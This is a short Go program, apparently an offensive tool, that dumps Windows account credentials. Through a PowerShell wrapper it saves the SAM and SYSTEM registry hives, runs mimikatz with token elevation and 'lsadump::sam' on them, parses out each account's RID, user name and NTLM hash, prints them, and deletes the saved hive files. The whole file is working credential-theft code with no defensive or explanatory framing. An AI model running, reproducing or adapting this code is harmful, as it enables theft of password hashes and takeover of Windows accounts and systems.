package main

import (
	"fmt"
	ps "github.com/bhendo/go-powershell"
	"github.com/bhendo/go-powershell/backend"
	"os"
	"strings"
)

type WindowUser struct {
	RID      string `json:"rid"`
	User     string `json:"user"`
	HashNTLM string `json:"hash_ntlm"`
}

func main() {
	users := []WindowUser{}
	back := &backend.Local{}
	shell, err := ps.New(back)
	if err != nil {
		panic(err)
	}
	defer shell.Exit()
	err = os.Chdir("mimi/x64")
	if err != nil {
		panic(err)
		return
	}
	stdout, _, err := shell.Execute("reg save HKLM\\SYSTEM mimi/x64/system2.hiv")
	if err != nil {
		panic(err.Error())
	}
	stdout, _, err = shell.Execute("reg save HKLM\\SAM mimi/x64/sam2.hiv")
	if err != nil {
		panic(err.Error())
	}
	fmt.Println(stdout)
	stdout, _, err = shell.Execute("cd mimi\\x64 ; .\\mimikatz 'token::elevate' 'lsadump::sam system2.hiv sam2.hiv' exit")
	if err != nil {
		panic(err.Error())
	}
	parts := strings.Split(strings.ReplaceAll(stdout, "\r\n", "\n"), "\n")
	for i, v := range parts {
		if strings.Contains(v, "RID") {
			ridParts := strings.Split(strings.Split(v, ": ")[1], " ")
			userParts := strings.Split(strings.Split(parts[i+1], ": ")[1], " ")
			ntlmParts := strings.Split(parts[i+2], ": ")
			users = append(users, WindowUser{
				RID:      ridParts[0],
				User:     userParts[0],
				HashNTLM: ntlmParts[1],
			})
		}
	}
	fmt.Println(users)
	_, _, err = shell.Execute("Remove-Item system2.hiv")
	if err != nil {
		panic(err.Error())
	}
	_, _, err = shell.Execute("Remove-Item sam2.hiv")
	if err != nil {
		panic(err.Error())
	}
}
